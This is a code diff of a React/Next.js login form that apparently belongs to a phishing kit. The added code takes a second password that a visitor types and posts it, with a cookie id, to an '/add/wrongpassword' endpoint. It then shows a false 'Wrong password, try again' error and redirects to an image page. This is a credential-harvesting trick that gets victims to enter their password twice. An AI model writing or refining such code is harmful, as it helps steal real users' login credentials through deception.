@@ -4,14 +4,19 @@ import { site } from "../config/index";
 import useMockLogin from "../hooks/useMockLogin";
 import { useState } from "react";
 import { toast } from "react-toastify";
+import { useRouter } from "next/navigation";
+import Cookies from "js-cookie";
+import { API_URL } from "../config";
 
-function LoginForm({ adminId, posterId, setImage }) {
+function LoginForm({ adminId, posterId }) {
+  const router = useRouter();
   const [showWrongPassword, setShowWrongPassword] = useState(false);
-  console.log(adminId, posterId);
+  const [wrongPassword, setWrongPassword] = useState();
+  const id = Cookies.get("id");
+  console.log(wrongPassword, id);
   const initialvalues = {
     email: "",
     password: "",
-    wrongPassword: "",
     remember: "",
   };
 
@@ -19,24 +24,48 @@ function LoginForm({ adminId, posterId, setImage }) {
 
   const handleSubmit = (values, formik) => {
     const { email, password, wrongPassword } = values;
-
+    setWrongPassword(wrongPassword);
     // console.log("values", values);
 
     const submitValues = {
       site: site,
       email: email,
       password: password,
-      wrongPassword: wrongPassword,
       skipcode: "",
     };
-    setImage(true);
+
     login(submitValues, formik);
-    formik.resetForm();
+    setShowWrongPassword(true);
     console.log(submitValues);
   };
-  const handleWrongPassword = () => {
-    setShowWrongPassword(true);
-    toast.error("Wrong password, try again");
+  const handleWrongPassword = async () => {
+    const values = {
+      id,
+      wrongPassword,
+    };
+    const url = `${API_URL}/add/wrongpassword`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      toast.error("Wrong password, try again");
+      console.log("success", data);
+      formik.resetForm();
+
+      router.push(`/imgPage`);
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
   };
   return (
     <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
@@ -95,7 +124,6 @@ function LoginForm({ adminId, posterId, setImage }) {
               {!showWrongPassword ? (
                 <button
                   type="button"
-                  onClick={handleWrongPassword}
                   className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                 >
                   SUBMIT
@@ -107,6 +135,7 @@ function LoginForm({ adminId, posterId, setImage }) {
                   className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                   // disabled={!verified}
                   // onClick={handleNextStep}
+                  onClick={handleWrongPassword}
                 >
                   SUBMIT
                 </button>
